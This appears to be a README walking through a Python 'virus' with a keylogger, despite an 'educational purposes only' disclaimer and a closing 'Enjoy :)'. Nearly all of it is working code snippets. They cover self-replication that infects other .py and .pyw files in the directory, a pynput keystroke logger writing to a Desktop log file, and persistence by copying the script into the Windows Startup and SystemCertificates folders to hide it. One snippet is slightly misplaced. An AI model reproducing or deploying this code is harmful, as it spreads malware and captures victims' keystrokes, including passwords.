THIS IS FOR EDUCATIONAL PERPOSES ONLY, IF YOU INDEND ON USING THIS FOR THE WRONG PURPOSE I WILL NOT BE RESPONSIBlE FOR YOUR ACTIONS, YOU WILL BE DOING SO AT YOUR OWN RISK.

You need pynput for this to run, if you do not have it installed, run: `pip install pynput`


Here’s a detailed breakdown of what my code does, step by step:

1. `Virus Structure Definition`
The script starts by defining the sections of the code that represent the "Virus":
```python
# Virus Beginning
# ...
# Virus End
```
The code that lies between these markers is the part that will replicate itself into other Python files.

2. `Reading Itself`
The code reads its own file to identify and extract the "Virus" portion:
```python
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
```
This reads the entire script into memory, line by line.


3. `Extracting Virus Code`
The script uses a loop to determine which lines belong to the "Virus":
```python
virus_area = False
for line in lines:
    if line == '# Virus Beginning\n':
        virus_area = True
    if virus_area:
        code.append(line)
```
It sets a flag when it finds the beginning of the virus code and appends all subsequent lines until it finds the end marker.

4. `Finding Other Python Scripts`
The script uses the glob module to identify other Python scripts in the current directory:
```python
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')

    if line == '# Virus End\n':
        break
```
This creates a list of all .py and .pyw files in the same directory.

5. `Checking for Infections`
For each Python script found, the code checks if it is already infected by looking for the virus markers:
```python
for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()
    infected = False
    for line in script_code:
        if line == '# Virus Beginning\n':
            infected = True
            break
```
If the script contains # Virus Beginning, it is marked as infected.

6. `Inserting the Virus Code`
If a script is not already infected, the code appends the extracted virus code to it:
```python
if not infected:
    final_code = []
    final_code.extend(code)
    final_code.append('\n')
    final_code.extend(script_code)

    with open(script, 'w') as f:
        f.writelines(final_code)

```
The new file is rewritten to include the virus code at the top.

7. `Keylogging Setup`
The script sets up a keylogger using the pynput library:
```python
from pynput.keyboard import Listener
```
This allows it to monitor and log keystrokes.

8. `Logging Configuration`
The script configures a logging system to log keystrokes:
```python
username = os.getlogin()
logging_directory = f"/Users/{username}/Desktop"
logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
```
It creates a log file named mylog.txt on the user's Desktop, where it will record the keystrokes.

9. `Key Handler Function`
The function key_handler is defined to log the keystrokes:
```python
def key_handler(key):
    logging.info(key)
```

10. `Starting the Keylogger`
Finally, the keylogger starts listening for keystrokes:
```python
with Listener(on_press=key_handler) as listener:
    listener.join()
```
The listener runs in the background, logging every key pressed until the program is terminated.

11. `Self-Copying`
Additionally, the script copies itself into the Windows Startup folder AND the SystemCertificates folder:
```python
copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/main.py')
copyfile(sys.argv[0], f'C:/Users/{username}/AppData/Roaming/Microsoft/SystemCertificates/My/main.py')
```
This ensures that the script runs automatically each time the user logs into their account, and that it's also hidden in system files

`Summary`
In essence, this script is designed to:
Replicate itself into other Python scripts within its directory.
Log keystrokes to a text file.
Copy itself to the Windows Startup folder and System Certificates folder for persistence.


Enjoy :)
